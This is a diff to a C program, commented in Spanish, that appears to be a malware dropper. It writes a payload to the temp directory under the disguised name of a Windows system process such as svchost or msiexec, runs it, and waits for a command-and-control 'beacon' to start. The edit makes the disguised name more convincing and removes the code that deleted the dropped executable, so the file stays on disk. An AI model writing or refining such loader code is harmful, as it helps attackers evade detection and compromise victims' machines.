@@ -198,7 +198,7 @@ int main() {
     // Nombre aleatorio más realista
     char target_path[MAX_PATH];
     const char* prefixes[] = { "svchost", "dllhost", "msiexec", "wmiprvse", "spoolsv" };
-    sprintf(target_path, "%s%s%d.exe", temp_path, prefixes[rand() % 5], rand() % 1000);
+    sprintf(target_path, "%s%s.exe", temp_path, prefixes[rand() % 5]);
 
     // Escribir archivo - SIN DELETE_ON_CLOSE
     HANDLE hFile = CreateFileA(target_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_TEMPORARY, NULL);
@@ -214,10 +214,6 @@ int main() {
     // Liberar payload DESPUÉS de escribir
     HeapFree(GetProcessHeap(), 0, raw_payload);
 
-    if (!success || written != raw_len) {
-        DeleteFileA(target_path);
-        return 1;
-    }
 
     // Ejecutar
     STARTUPINFOA si = {0};
@@ -231,9 +227,6 @@ int main() {
         Sleep(2000);  // Esperar a que el beacon inicie
         exec_ok = TRUE;
     }
-
-    // Borrar archivo solo después de ejecutar
-    DeleteFileA(target_path);
 
     return exec_ok ? 0 : 1;
 }
